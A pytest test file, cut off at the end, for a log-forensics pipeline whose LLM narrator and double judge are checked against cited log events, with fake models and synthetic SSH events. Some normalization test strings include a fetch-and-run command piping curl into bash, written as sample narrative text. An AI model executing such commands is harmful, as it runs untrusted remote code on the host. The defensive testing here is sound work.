import json
import re
import shutil
from datetime import datetime, timezone
from pathlib import Path

import pytest
import requests

from evidenceweave import runmeta
from evidenceweave import schema as S
from evidenceweave.correlation.engine import correlate_case, write_outputs
from evidenceweave.generator.core import generate
from evidenceweave.narrator import facts as F
from evidenceweave.narrator import prompts as P
from evidenceweave.narrator.llm import LLMResult, parse_fact_sentences
from evidenceweave.narrator.narrate import NarratorConfig, narrate_chain, summary_facts_info
from evidenceweave.narrator.packs import load_events
from evidenceweave.parsers.pipeline import load_hosts, write_events
from evidenceweave.schema import Event
from evidenceweave.verifier import runner
from evidenceweave.verifier import verdicts as V
from evidenceweave.verifier.baseline_verify import verify_baseline
from evidenceweave.verifier.corruption import FAKE_CLAIMS, base_sentences, candidates, run_corruption
from evidenceweave.verifier.entities import Facts
from evidenceweave.verifier.judge import ClaimJudge, parse_claims
from evidenceweave.verifier.repair import VerifyConfig, verify_chain
from evidenceweave.verifier.structure import check_structure, fix_dangling, normalize
from evidenceweave.verifier.verify import UnitCtx, Verifier, load_case_data

ROOT = Path(__file__).resolve().parent.parent
FACT_LINE = re.compile(r"^\s*\[([\w-]+)\] (.*?) \| cites: (.*)$", re.M)


# ---------------- fakes ----------------
def parse_facts(user):
    out = {}
    for fid, text, cites in FACT_LINE.findall(user):
        out.setdefault(fid, (text, [c.strip() for c in cites.split(",") if c.strip()]))
    return out


def sentence_for(facts, ids):
    return {"text": " ".join(facts[i][0] for i in ids), "fact_ids": list(ids),
            "cites": sorted({c for i in ids for c in facts[i][1]})}


def faithful(user):
    facts = parse_facts(user)
    if "REPAIR:" in user and "Rejected sentence" in user:
        blocks = re.findall(r"Rejected sentence \d+ \(based on facts: ([^)]*)\)", user)
        sents = []
        for b in blocks:
            ids = [x.strip() for x in b.split(",") if x.strip() in facts] or [next(iter(facts))]
            sents.append(sentence_for(facts, ids))
        return json.dumps({"sentences": sents})
    return json.dumps({"sentences": [sentence_for(facts, [i]) for i in facts]})


def bad_sentence(user, fid=None):
    facts = parse_facts(user)
    fid = fid or next(iter(facts))
    return {"text": "The activity came from 10.0.0.512 at that time.", "fact_ids": [fid], "cites": facts[fid][1][:1]}


class FactNarr:
    """Fake narrator. handler(system, user, options, call_no) -> reply text or None (faithful rewrite of the facts)."""

    def __init__(self, handler=None, model="narrator-model", seq=None):
        self.handler, self.model, self.seq, self.calls = handler, model, seq, []
        self.options, self.json_mode = {"temperature": 0, "seed": 42, "num_ctx": 16384}, "schema"

    def complete(self, system, user, options=None, schema=None, validator=None):
        self.calls.append((user, options))
        if self.seq is not None:
            self.seq.append("narrator")
        text = self.handler(system, user, options, len(self.calls)) if self.handler else None
        text = text if text is not None else faithful(user)
        parsed = parse_fact_sentences(text)
        return LLMResult(parsed is not None, text, parsed, 0.0, "schema", options_used=options)


def claims_reply(user, supported=True, quote=None, verdict="supported"):
    line = next((l for l in user.splitlines() if re.match(r"(?:AUTH|NGX|WIN)-L\d+ \| ", l)), "")
    q = quote if quote is not None else (line.split(" | ", 2)[2][:12] if line.count(" | ") >= 2 else "")
    return json.dumps({"claims": [{"claim": "c", "supported": supported, "quote": q}], "verdict": verdict, "reason": "r"})


class FClaimLLM:
    """Fake judge model. handler(user, options, call_no) -> reply text; default = one supported claim quoting a real line."""

    def __init__(self, handler=None, model="judge-model", seq=None):
        self.handler, self.model, self.seq, self.calls = handler, model, seq, []
        self.options, self.json_mode = {"temperature": 0, "seed": 42, "num_ctx": 8192}, "schema"

    def complete(self, system, user, options=None, schema=None, validator=None):
        self.calls.append((user, options))
        if self.seq is not None:
            self.seq.append("judge")
        text = self.handler(user, options, len(self.calls)) if self.handler else claims_reply(user)
        return LLMResult(True, text, None, 0.0, "schema")


def stage_of(user):
    m = re.search(r"^STAGE: (\w+)", user, re.M)
    return m.group(1) if m else ("executive_summary" if "ATTACK CHAIN, IN ORDER" in user else None)


def is_repair(user):
    return "REPAIR:" in user


# ---------------- fixtures ----------------
def make_case(root: Path, name: str, difficulty: str, seed: int):
    generate(name, difficulty, seed, root / "cases")
    case, findings, chain = correlate_case(root / "cases" / name)
    write_outputs(name, findings, chain, root / "out")
    write_events(case, root / "out" / name / "events.jsonl")


@pytest.fixture(scope="module")
def prepared(tmp_path_factory):
    root = tmp_path_factory.mktemp("p5b")
    make_case(root, "case01", "easy", 42)
    make_case(root, "case02", "hard", 7)
    return root


@pytest.fixture(scope="module")
def many(tmp_path_factory):
    root = tmp_path_factory.mktemp("p5bmany")
    for seed in (1, 2, 3, 4):
        for d in ("easy", "hard"):
            make_case(root, f"s{seed}{d}", d, seed)
    return root


def harness(prepared, tmp_path, name="case01", narr_handler=None, judge_handler=None, max_retries=2, double=True,
            meta=None, narr_model="narrator-model", judge_model="judge-model", use_judge=True):
    d = tmp_path / name
    shutil.copytree(prepared / "out" / name, d)
    seq = []
    narr = FactNarr(narr_handler, narr_model, seq)
    narrate_chain(d, narr, NarratorConfig(mode="facts"), run_meta=meta)
    narr.calls.clear()
    seq.clear()
    data = load_case_data(d, load_hosts(prepared / "cases" / name))
    jl = FClaimLLM(judge_handler, judge_model, seq)
    judge = ClaimJudge(jl, double=double) if use_judge else None
    msgs = []
    res = verify_chain(data, narr, judge, VerifyConfig(max_retries, 8, use_judge), progress=msgs.append, run_meta=meta)
    return res, narr, jl, seq, data, msgs


def stage_entry(res, stage):
    return next(s for s in res["verified"]["stages"] if s["stage"] == stage)


# ================= 1. facts builder =================
def det_ctx(data, stage, facts):
    base = data.ctxs[stage]
    return UnitCtx(base.name, base.section, set(F.allowed_ids(facts, data.events)), base.facts)


def test_facts_pass_deterministic_layers_over_seeds_and_difficulties(many):
    total = 0
    for name in sorted(p.name for p in (many / "out").iterdir()):
        data = load_case_data(many / "out" / name, load_hosts(many / "cases" / name))
        vr = Verifier(data.events, data.host_names)
        facts = F.build_facts(data.chain, data.findings, data.events, 8)
        assert [st["stage"] for st in data.chain["stages"]] == list(facts)
        for stage, fl in facts.items():
            assert fl, (name, stage)
            for f in fl:
                total += 1
                assert f["cites"], f
                assert all(c in data.events for c in f["cites"])
                v = vr.det(det_ctx(data, stage, fl), f["text"], f["cites"], 0, 0, "llm", False)
                assert v.det_passed(), (name, f["fact_id"], f["text"], v.failures())
    assert total > 100


def test_facts_deterministic_cap_priority_and_order(prepared):
    data = load_case_data(prepared / "out" / "case02", load_hosts(prepared / "cases" / "case02"))
    a = F.build_facts(data.chain, data.findings, data.events, 8)
    assert a == F.build_facts(data.chain, data.findings, data.events, 8)
    full = F.build_facts(data.chain, data.findings, data.events, 100)
    small = F.build_facts(data.chain, data.findings, data.events, 3)
    for stage, fl in small.items():
        assert len(fl) <= 3 and len(a[stage]) <= 8
        want = sorted(F.PRIORITY[f["kind"]] for f in full[stage])[:3]
        assert sorted(F.PRIORITY[f["kind"]] for f in fl) == want  # chosen in fixed priority order
        assert fl[0]["fact_id"] == f"{stage}-F1" and [f["fact_id"] for f in fl] == [f"{stage}-F{i}" for i in range(1, len(fl) + 1)]
        firsts = [data.events[f["cites"][0]].timestamp for f in fl]
        assert firsts == sorted(firsts)  # presented chronologically
        assert "time_window" in {f["kind"] for f in fl}
    kinds = {f["kind"] for fl in full.values() for f in fl}
    assert {"time_window", "actor", "key_action", "count", "link", "status"} <= kinds


def test_facts_cover_links_and_status(prepared):
    data = load_case_data(prepared / "out" / "case02", load_hosts(prepared / "cases" / "case02"))
    facts = F.build_facts(data.chain, data.findings, data.events, 8)
    ia_allowed = set(F.allowed_ids(facts["initial_access"], data.events))
    bf_ids = set(data.chain["stages"][0]["evidence_event_ids"])
    assert ia_allowed & bf_ids  # the link fact cites the brute-force events, which join the allowed list
    assert any(f["kind"] == "status" and "No log event creating" in f["text"] for f in facts["persistence"])
    sudo = next(f for f in facts["privilege_escalation"] if f["kind"] == "key_action")
    cmd = data.events[sudo["cites"][0]].extra["command"]
    assert f"`{cmd}`" in sudo["text"]  # the command is quoted exactly as in the event


def test_facts_builder_has_no_case_specific_strings():
    src = (ROOT / "evidenceweave" / "narrator" / "facts.py").read_text(encoding="utf-8")
    for bad in ("203.0.113", "198.51.100", "10.0.0.", "svc_backup", "deploy", "ws-fin01", "web01", "x.sh", "b.sh",
                "WindowsUpdateCheck", "temp_intern", "answer_key"):
        assert bad not in src, bad


# ================= 2. facts prompts =================
def test_facts_prompts(prepared):
    data = load_case_data(prepared / "out" / "case01", load_hosts(prepared / "cases" / "case01"))
    facts = F.build_facts(data.chain, data.findings, data.events, 8)
    fl, allowed = facts["privilege_escalation"], F.allowed_ids(facts["privilege_escalation"], data.events)
    prompt = P.facts_stage_prompt("privilege_escalation", "confirmed", fl, allowed)
    for f in fl:
        assert f["fact_id"] in prompt and f["text"] in prompt
    assert "ALLOWED CITE IDS: " + ", ".join(allowed) in prompt
    assert set(re.findall(r"\b(?:AUTH|NGX|WIN)-L\d+\b", prompt)) == set(allowed)
    for phrase in ("ONE sentence per fact", "Do not add any information", "exactly as written", "fact_ids", "Do not speculate"):
        assert phrase in P.FACTS_STAGE_SYSTEM
    assert "answer_key" not in prompt + P.FACTS_STAGE_SYSTEM + P.FACTS_SUMMARY_SYSTEM
    assert P.PROMPT_VERSION == "p4-v1" and P.PROMPT_VERSION_FACTS != P.PROMPT_VERSION
    info = summary_facts_info(data.chain, facts)
    sp = P.facts_summary_prompt(info)
    for st in data.chain["stages"]:
        stage_facts = facts[st["stage"]]
        for f in stage_facts[:2]:
            assert f"[{f['fact_id']}]" in sp
        for f in stage_facts[2:]:
            assert f"[{f['fact_id']}]" not in sp  # only the first two facts of each stage
    assert "3 to 5 sentence" in sp


# ================= 3. facts-mode checks =================
def hev(n, action, hms, host="web01", user=None, ip=None, raw=None, **extra):
    h, m, s = map(int, hms.split(":"))
    ts = datetime(2026, 10, 27, h, m, s, tzinfo=timezone.utc)
    return Event(f"AUTH-L{n}", ts, ts, False, host, user, ip, None, "auth", action, "f", n, raw or f"{hms} {host} line {n}", extra)


E1 = hev(1, S.SSH_LOGIN_SUCCESS, "02:15:05", user="deploy", ip="203.0.113.45",
         raw="Oct 27 02:15:05 web01 sshd[9]: Accepted password for deploy from 203.0.113.45 port 5555 ssh2")
E2 = hev(2, S.SSH_LOGIN_FAILED, "02:14:00", user="root", ip="203.0.113.45",
         raw="Oct 27 02:14:00 web01 sshd[8]: Failed password for root from 203.0.113.45 port 4444 ssh2")
EV = {e.event_id: e for e in (E1, E2)}
FACT_CTX = UnitCtx("st", "stage", {"AUTH-L1", "AUTH-L2"}, Facts(), fact_map={
    "st-F1": {"fact_id": "st-F1", "text": "There were 11 attempts.", "cites": ["AUTH-L2"]},
    "st-F2": {"fact_id": "st-F2", "text": "There were 99 events.", "cites": ["AUTH-L1"]}})


def fdet(text, cites, fact_ids):
    return Verifier(EV, ["web01"]).det(FACT_CTX, text, cites, 0, 0, "llm", False, fact_ids)


def test_fact_reference_checks():
    v = fdet("There were 11 attempts.", ["AUTH-L2"], ["st-F9"])
    assert [r["code"] for r in v.layer_results["facts"]["reasons"]] == [V.FACT_ID_UNKNOWN]
    v = fdet("There were 11 attempts.", ["AUTH-L2", "AUTH-L1"], ["st-F1"])
    assert [r["code"] for r in v.layer_results["facts"]["reasons"]] == [V.CITES_NOT_FROM_FACTS]
    assert "AUTH-L1" in v.layer_results["facts"]["reasons"][0]["detail"]
    v = fdet("There were 11 attempts.", ["AUTH-L2"], [])
    assert [r["code"] for r in v.layer_results["facts"]["reasons"]] == [V.NO_FACT_REFERENCE]
    v = fdet("There were 11 attempts.", ["AUTH-L2"], ["st-F1"])
    assert v.layer_results["facts"]["passed"] is True and v.det_passed() and v.fact_ids == ["st-F1"]
    ok = fdet("There were 11 attempts.", ["AUTH-L2"], ["st-F1", "st-F2"])
    assert ok.det_passed() is True  # a subset of the union of the referenced facts' cites is fine


def test_pool_includes_only_referenced_fact_text():
    assert fdet("There were 11 attempts.", ["AUTH-L2"], ["st-F1"]).layer_results["entities"]["passed"] is True  # 11 only in fact text
    bad = fdet("There were 99 events.", ["AUTH-L2"], ["st-F1"])  # 99 only appears in the UNREFERENCED fact F2
    assert [r["code"] for r in bad.layer_results["entities"]["reasons"]] == [V.NUMBER_NOT_GROUNDED]
    assert fdet("There were 99 events.", ["AUTH-L1"], ["st-F2"]).layer_results["entities"]["passed"] is True


def test_faithful_rewrite_passes_every_layer(prepared):
    data = load_case_data(prepared / "out" / "case01", load_hosts(prepared / "cases" / "case01"))
    facts = F.build_facts(data.chain, data.findings, data.events, 8)
    stage = "initial_access"
    ctx = UnitCtx(stage, "stage", set(F.allowed_ids(facts[stage], data.events)), data.ctxs[stage].facts,
                  fact_map={f["fact_id"]: f for f in facts[stage]})
    vr = Verifier(data.events, data.host_names)
    for f in facts[stage]:
        v = vr.det(ctx, f["text"], f["cites"], 0, 0, "llm", False, [f["fact_id"]])
        assert v.det_passed() and v.accepted, v.failures()


# ================= 4. hardened judge =================
def judge_with(handler, double=True, sentence="The deploy user logged in from 203.0.113.45."):
    jl = FClaimLLM(handler)
    j = ClaimJudge(jl, double=double)
    return j, jl, j.judge(sentence, [E1, E2])


def test_claims_schema_parsed_and_verdict_derived():
    assert parse_claims(claims_reply("x", quote="abc")) is not None
    assert parse_claims('{"claims": "no", "verdict": "supported", "reason": "r"}') is None
    assert parse_claims("garbage") is None
    good = lambda u, o, n: json.dumps({"claims": [
        {"claim": "login", "supported": True, "quote": "Accepted password for deploy from 203.0.113.45"},
        {"claim": "port", "supported": True, "quote": "port   5555"}], "verdict": "supported", "reason": "r"})  # whitespace-normalized
    _, jl, res = judge_with(good)
    assert res["verdict"] == "supported" and res["agreement"] is True and res["codes"] == [] and len(jl.calls) == 2
    partial = lambda u, o, n: json.dumps({"claims": [
        {"claim": "a", "supported": True, "quote": "Accepted password for deploy"},
        {"claim": "b", "supported": False, "quote": ""}], "verdict": "supported", "reason": "r"})
    assert judge_with(partial)[2]["verdict"] == "partial"  # derived in code although the judge said supported
    assert judge_with(lambda u, o, n: json.dumps({"claims": [], "verdict": "supported", "reason": "r"}))[2]["verdict"] == "unsupported"


def test_invalid_quote_is_not_accepted_even_if_judge_says_supported():
    fake_quote = lambda u, o, n: claims_reply(u, quote="The attacker logged in at midnight", verdict="supported")
    j, _, res = judge_with(fake_quote)
    assert res["verdict"] == "unsupported" and (V.JUDGE_QUOTE_INVALID, ) == (res["codes"][0][0], )
    assert res["own_vs_derived_disagreements"] == 2  # both runs: judge said supported, code derived unsupported
    v = Verifier(EV, ["web01"]).det(UnitCtx("st", "stage", {"AUTH-L1", "AUTH-L2"}), "The deploy user logged in from 203.0.113.45.",
                                    ["AUTH-L1"], 0, 0, "llm", True)
    Verifier(EV, ["web01"]).apply_judge(j, UnitCtx("st", "stage", {"AUTH-L1"}), v)
    assert not v.accepted and V.JUDGE_QUOTE_INVALID in v.codes()
    assert v.judge["runs"][0]["claims"][0]["invalid_quote"] is True


def test_double_judging_disagreement_and_agreement():
    def split(u, o, n):  # run 1 (no options) supported, run 2 (seed 43) unsupported
        return claims_reply(u) if o is None else claims_reply(u, supported=False, quote="")

    j, jl, res = judge_with(split)
    assert res["verdict"] == "disagree" and res["agreement"] is False
    assert [c[0] for c in res["codes"]] == [V.JUDGE_DISAGREE]
    assert [o for _, o in jl.calls] == [None, {"seed": 43}]  # second call: seed 43, same input
    assert jl.calls[0][0] == jl.calls[1][0]
    v = Verifier(EV, ["web01"]).det(UnitCtx("st", "stage", {"AUTH-L1"}), "The deploy user logged in from 203.0.113.45.",
                                    ["AUTH-L1"], 0, 0, "llm", True)
    Verifier(EV, ["web01"]).apply_judge(j, UnitCtx("st", "stage", {"AUTH-L1"}), v)
    assert not v.accepted and V.JUDGE_DISAGREE in v.codes()
    ok = judge_with(None)[2]
    assert ok["verdict"] == "supported" and ok["agreement"] is True and ok["own_vs_derived_disagreements"] == 0


def test_single_judge_and_unparseable_retry():
    _, jl, res = judge_with(None, double=False)
    assert len(jl.calls) == 1 and res["verdict"] == "supported" and len(res["runs"]) == 1
    seen = []

    def flaky(u, o, n):
        seen.append(n)
        return "nonsense" if n == 1 else claims_reply(u)

    _, jl, res = judge_with(flaky, double=False)
    assert res["verdict"] == "supported" and len(jl.calls) == 2 and "Reminder" in jl.calls[1][0]
    _, jl, res = judge_with(lambda u, o, n: "still nonsense", double=False)
    assert res["verdict"] == "judge_error" and len(jl.calls) == 2 and res["codes"][0][0] == V.JUDGE_ERROR
    v = Verifier(EV, ["web01"]).det(UnitCtx("st", "stage", {"AUTH-L1"}), "The deploy user logged in from 203.0.113.45.",
                                    ["AUTH-L1"], 0, 0, "llm", True)
    Verifier(EV, ["web01"]).apply_judge(ClaimJudge(FClaimLLM(lambda u, o, n: "x"), double=False), UnitCtx("st", "stage", {"AUTH-L1"}), v)
    assert not v.accepted and v.codes() == [V.JUDGE_ERROR]


def test_judge_prompt_unchanged_inputs_and_independence(prepared, tmp_path):
    res, narr, jl, seq, data, msgs = harness(prepared, tmp_path, narr_model="same", judge_model="same")
    assert res["verified"]["verification"]["judge_independent"] is False
    assert any("NOT independent" in m for m in msgs)
    user = jl.calls[0][0]
    assert "SENTENCE:" in user and "LOG LINES" in user and "fact_id" not in user and "[persistence-F" not in user  # no fact texts
    s = res["report"]["summary"]
    assert s["judge_agreement_rate"] == 1.0 and s["judge_error_count"] == 0
    res2, *_ = harness(prepared, tmp_path / "b")
    assert res2["verified"]["verification"]["judge_independent"] is True


# ================= 5. repair =================
def test_repair_options_feedback_and_freezing(prepared, tmp_path):
    state = {"n": 0}

    def narr(system, user, options, n):
        if stage_of(user) != "persistence":
            return None
        facts = parse_facts(user)
        ids = list(facts)
        if not is_repair(user):  # attempt 0: sentence 1 fine, sentence 2 bad, sentence 3 fine
            return json.dumps({"sentences": [sentence_for(facts, [ids[0]]), bad_sentence(user, ids[1]), sentence_for(facts, [ids[2]])]})
        state["n"] += 1
        if state["n"] == 1:  # round 1: still bad
            return json.dumps({"sentences": [bad_sentence(user, ids[1])]})
        return None  # round 2: faithful rewrite of the one remaining rejected sentence

    res, nr, jl, seq, data, _ = harness(prepared, tmp_path, name="case01", narr_handler=narr)
    assert len(nr.calls) == 2  # only the failing stage is repaired; every other stage passed first time
    (u1, o1), (u2, o2) = nr.calls
    assert o1 == {"temperature": 0.3, "seed": 43} and o2 == {"temperature": 0.3, "seed": 44}
    for u in (u1, u2):
        assert "Rejected sentence 1" in u and "Return exactly 1 sentence" in u and "Rewrite ONLY the rejected sentences" in u
        assert "MALFORMED_IP" in u and "not a valid IPv4" in u and "based on facts: persistence-F2" in u
    assert "The activity came from 10.0.0.512" in u1 and "Rejected sentence 2" not in u1
    facts = data.narrative_stage_facts("persistence")
    assert facts[0]["text"] not in u1.split("REPAIR:")[1] and facts[2]["text"] not in u1.split("REPAIR:")[1]  # accepted ones not re-sent
    st = stage_entry(res, "persistence")
    assert [s["text"] for s in st["sentences"]] == [facts[0]["text"], facts[1]["text"], facts[2]["text"]]
    assert [s["attempt"] for s in st["sentences"]] == [0, 2, 0]  # accepted sentences kept unchanged, the fix came in round 2
    eff = res["report"]["summary"]["repair_effectiveness"]
    assert eff["failing_at_attempt0"] == 1 and eff["fixed_by_round"] == {"1": 0, "2": 1} and eff["still_failing"] == 0
    assert eff["per_code"]["MALFORMED_IP"] == {"failing_at_attempt0": 1, "still_failing": 0, "fixed_round_1": 0, "fixed_round_2": 1}
    assert res["report"]["summary"]["repair"]["temperature"] == 0.3 and res["report"]["summary"]["repair"]["base_seed"] == 42
    rep = res["report"]["attempts"]["persistence"]
    assert [a["options"] for a in rep[1:]] == [o1, o2] and rep[0]["feedback_used"] is False and rep[1]["feedback_used"] is True


def test_attempt0_uses_temperature_zero_and_no_repair_when_all_pass(prepared, tmp_path):
    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)
    narr = FactNarr()
    narrate_chain(d, narr, NarratorConfig(mode="facts"))
    assert all(o is None for _, o in narr.calls) and narr.options["temperature"] == 0 and narr.options["seed"] == 42
    out = json.loads((d / "narrative.json").read_text())
    assert out["narration_mode"] == "facts" and out["prompt_version"] == P.PROMPT_VERSION_FACTS and out["max_facts_per_stage"] == 8
    assert all(s["facts"] and set(s["allowed_cite_ids"]) == {c for f in s["facts"] for c in f["cites"]} for s in out["stages"])
    res, nr, *_ = harness(prepared, tmp_path / "x")
    assert nr.calls == [] and res["verified"]["verification"]["fallback_units"] == []
    assert res["report"]["summary"]["repair_effectiveness"]["failing_at_attempt0"] == 0


def test_fallback_renders_facts_verbatim_one_sentence_per_fact(prepared, tmp_path):
    h = lambda s, u, o, n: json.dumps({"sentences": [bad_sentence(u)]}) if stage_of(u) == "web_recon" else None
    res, nr, jl, seq, data, _ = harness(prepared, tmp_path, narr_handler=h)
    st = stage_entry(res, "web_recon")
    facts = data.narrative_stage_facts("web_recon")
    order = sorted(range(len(facts)), key=lambda i: (F.PRIORITY[facts[i]["kind"]], i))
    assert st["fallback"] and st["source"] == "template_fallback" and len(nr.calls) == 2
    assert [s["text"] for s in st["sentences"]] == [facts[i]["text"] for i in order]  # verbatim, priority order
    assert {s["source"] for s in st["sentences"]} == {"template_fallback"}
    assert [s["fact_ids"] for s in st["sentences"]] == [[facts[i]["fact_id"]] for i in order]
    fb = [v for v in res["report"]["verdicts"] if v["source"] == "template_fallback" and v["stage"] == "web_recon"]
    assert fb and all(v["accepted"] and v["judge"] is None and v["layer_results"]["semantics"]["passed"] is True for v in fb)
    assert not res["report"]["summary"]["template_failures"]


def test_round_order_batches_narrator_before_judge(prepared, tmp_path):
    h = lambda s, u, o, n: json.dumps({"sentences": [bad_sentence(u)]}) if stage_of(u) in ("persistence", "web_recon") and not is_repair(u) else None
    res, nr, jl, seq, data, _ = harness(prepared, tmp_path, narr_handler=h)
    log = res["report"]["call_log"]
    collapse = lambda xs: [x for i, x in enumerate(xs) if i == 0 or xs[i - 1] != x]  # a sentence = 2 judge calls, 1 log entry
    assert collapse([c["kind"] for c in log]) == collapse(seq)
    r1 = [c["kind"] for c in log if c["round"] == 1]
    assert r1[:2] == ["narrator", "narrator"] and set(r1[2:]) == {"judge"}
    assert res["report"]["summary"]["model_swaps"] == 2


def test_executive_summary_repair_and_fallback(prepared, tmp_path):
    h = lambda s, u, o, n: "garbage" if stage_of(u) == "executive_summary" else None
    res, nr, *_ = harness(prepared, tmp_path, narr_handler=h)
    ex = res["verified"]["executive_summary"]
    facts = {st["stage"]: st["facts"] for st in res["verified"]["stages"]}
    assert [s["text"] for s in ex] == [facts[st["stage"]][0]["text"] for st in res["verified"]["stages"]]  # first fact of each stage
    assert {s["source"] for s in ex} == {"template_fallback"} and res["verified"]["verification"]["fallback_units"] == ["executive_summary"]


def test_fact_coverage_block(prepared, tmp_path):
    h = lambda s, u, o, n: json.dumps({"sentences": [bad_sentence(u)]}) if stage_of(u) == "web_recon" else None
    res, *_ = harness(prepared, tmp_path, narr_handler=h)
    fc = res["report"]["summary"]["fact_coverage"]
    assert fc == res["verified"]["fact_coverage"]
    total = sum(len(s["facts"]) for s in res["verified"]["stages"])
    expressed = sum(len(s["facts"]) for s in res["verified"]["stages"] if s["stage"] != "web_recon")
    assert fc["facts_total"] == total and fc["facts_expressed_by_accepted_llm_sentences"] == expressed
    assert fc["coverage_rate"] == round(expressed / total, 4)
    assert fc["stages_fallback_only"] == ["web_recon"] and "web_recon" not in fc["stages_with_accepted_llm_sentence"]
    assert fc["facts_per_stage"]["web_recon"] == {"total": len(next(s for s in res["verified"]["stages"] if s["stage"] == "web_recon")["facts"]), "expressed": 0}


# ================= 6. bug fixes =================
def test_normalization_keeps_legitimate_closing_quotes():
    assert normalize("He ran 'ls -la'.") == "He ran 'ls -la'."
    assert normalize("The command `curl -s http://x/y | bash`.") == "The command `curl -s http://x/y | bash`."
    assert normalize('He said "go".') == 'He said "go".'
    assert normalize("It ran fine.'''") == "It ran fine."  # junk after a quote-free sentence is removed
    assert normalize("It ran fine.\", ") == "It ran fine."
    assert normalize("Ran '/bin/bash -c 'curl x'''., ") == "Ran '/bin/bash -c 'curl x''."  # only the ONE excess quote goes
    assert normalize("It's the attacker's host.") == "It's the attacker's host."


def test_dangling_endings_removed_or_failed():
    ev = {"AUTH-L330": 1, "AUTH-L1": 1}
    norm, cites, lr = check_structure("Privilege escalation followed with deploy running a suspicious command, as shown by AUTH-L330.",
                                      [], {"AUTH-L330"}, ev, 8)
    assert norm == "Privilege escalation followed with deploy running a suspicious command." and cites == ["AUTH-L330"] and lr["passed"]
    assert any(r["code"] == V.NORMALIZED and "dangling" in r["detail"] for r in lr["reasons"])
    for text in ("The command was run from.", "It was reported by the.", "The host was contacted via (", "Seen together with and."):
        norm, _, lr = check_structure(text, ["AUTH-L1"], {"AUTH-L1"}, ev, 8)
        assert V.DANGLING_ENDING in [r["code"] for r in lr["reasons"]], text
    norm, _, lr = check_structure("As shown by.", ["AUTH-L1"], {"AUTH-L1"}, ev, 8)
    assert V.EMPTY_TEXT in [r["code"] for r in lr["reasons"]]  # nothing left after removing the dangling phrase
    for ok in ("The user logged in.", "The login came from 203.0.113.45.", "It ran `ls -la`."):
        assert check_structure(ok, ["AUTH-L1"], {"AUTH-L1"}, ev, 8)[2]["passed"], ok
    assert fix_dangling("It started, see.")[0:2] == ("It started.", True)


# ================= 7. reproducibility =================
def test_run_metadata_in_all_five_outputs_with_null_and_note(prepared, tmp_path, monkeypatch):
    monkeypatch.setattr(runmeta.requests, "get", lambda *a, **k: (_ for _ in ()).throw(requests.ConnectionError("down")))
    narr0 = FactNarr()
    jl = FClaimLLM()
    vcfg, ncfg = VerifyConfig(), NarratorConfig(mode="facts")
    meta = runner.make_meta(narr0, ClaimJudge(jl), vcfg, ncfg)
    assert meta["ollama_version"] is None and "ConnectionError" in meta["ollama_version_note"]
    assert all(v is None for v in meta["model_digests"].values()) and meta["model_digests_note"]
    for k in ("date", "python_version", "git_commit", "narration_mode", "max_cites", "max_facts_per_stage", "prompt_versions"):
        assert k in meta
    assert meta["narration_mode"] == "facts" and meta["max_facts_per_stage"] == 8 and meta["max_cites"] == 8
    o = meta["ollama_options"]
    assert o["narrator_attempt0"]["temperature"] == 0 and o["repair"]["temperature"] == 0.3
    assert o["judge_run1"]["seed"] == 42 and o["judge_run2"]["seed"] == 43
    assert meta["prompt_versions"]["narrator"] == P.PROMPT_VERSION_FACTS

    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)
    narrate_chain(d, narr0, ncfg, run_meta=meta)
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    res = verify_chain(data, narr0, ClaimJudge(jl), vcfg, run_meta=meta)
    e = next(iter(data.events.values()))
    (d / "baseline_narrative.json").write_text(json.dumps({"model": "m", "sentences": [
        {"text": f"An event was logged on {e.host}.", "cites": [e.event_id]}]}))
    verify_baseline(data, ClaimJudge(jl), run_meta=meta)
    run_corruption(data, res["verified"], ClaimJudge(jl), run_meta=meta)
    for f in ("narrative.json", "narrative_verified.json", "verification_report.json", "baseline_verification.json",
              "corruption_report.json"):
        got = json.loads((d / f).read_text())["run_metadata"]
        assert got["collected"] is True and got["ollama_version"] is None and got["python_version"] == meta["python_version"], f


def test_run_metadata_with_server_available(monkeypatch):
    class R:
        def __init__(self, data):
            self.data = data

        def raise_for_status(self):
            pass

        def json(self):
            return self.data

    monkeypatch.setattr(runmeta.requests, "get", lambda url, timeout: R({"version": "0.9.9"} if url.endswith("version")
                                                                       else {"models": [{"name": "a:1", "digest": "abc"}]}))
    m = runmeta.collect(["a:1", "b:2"], {}, {}, "raw", 8, None)
    assert m["ollama_version"] == "0.9.9" and m["model_digests"] == {"a:1": "abc", "b:2": None}
    assert m["model_digests_note"] == "model not listed by /api/tags"


def test_summarize_mean_min_max():
    s = runner.summarize([1, 2, 6])
    assert s == {"values": [1, 2, 6], "mean": 3.0, "min": 1, "max": 6}
    assert runner.summarize([None, 0.5, 1.0])["mean"] == 0.75 and runner.summarize([None, None])["mean"] is None
    per = runner.summarize_runs([{"a": 1, "t": {"x": 1.0}}, {"a": 3, "t": {"x": None}}])
    assert per["a"]["mean"] == 2.0 and per["t"]["x"]["values"] == [1.0, None] and per["t"]["x"]["max"] == 1.0


def test_repeat_creates_runs_and_metrics_come_from_each_runs_own_files(prepared, tmp_path):
    case_out = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", case_out)
    state = {"run": 0}

    def narr(system, user, options, n):
        if stage_of(user) == "brute_force" and not is_repair(user):
            state["run"] += 1
        if state["run"] == 2 and stage_of(user) == "persistence":  # run 2 only: persistence never gets a valid sentence
            return json.dumps({"sentences": [bad_sentence(user)]})
        return None

    nr, jl = FactNarr(narr), FClaimLLM()
    doc = runner.repeat(case_out, load_hosts(prepared / "cases" / "case01"), "chain", 3, nr, ClaimJudge(jl), VerifyConfig(),
                        NarratorConfig(mode="facts"))
    runs = sorted((case_out / "runs").iterdir())
    assert [r.name for r in runs] == ["chain_run1", "chain_run2", "chain_run3"]
    assert all((r / f).exists() for r in runs for f in ("narrative.json", "narrative_verified.json", "verification_report.json"))
    summ = json.loads((case_out / "repeat_summary.json").read_text())["chain"]
    assert summ == doc and summ["runs"] == 3
    per = summ["per_run"]
    assert [p["fallback_units"] for p in per] == [0, 1, 0]  # the runs differ, and each run's metric reflects its own output
    assert per[1]["final_accepted_sentences"] < per[0]["final_accepted_sentences"] == per[2]["final_accepted_sentences"]
    assert per[1]["fact_coverage"] < per[0]["fact_coverage"]
    for k, r in enumerate(runs):
        assert runner.chain_metrics(r) == per[k]  # recomputed from the run's own files
    m = summ["metrics"]["fallback_units"]
    assert m == {"values": [0, 1, 0], "mean": round(1 / 3, 4), "min": 0, "max": 1}
    assert set(per[0]) == {"attempt0_supported_rate", "final_accepted_sentences", "fact_coverage", "fallback_units",
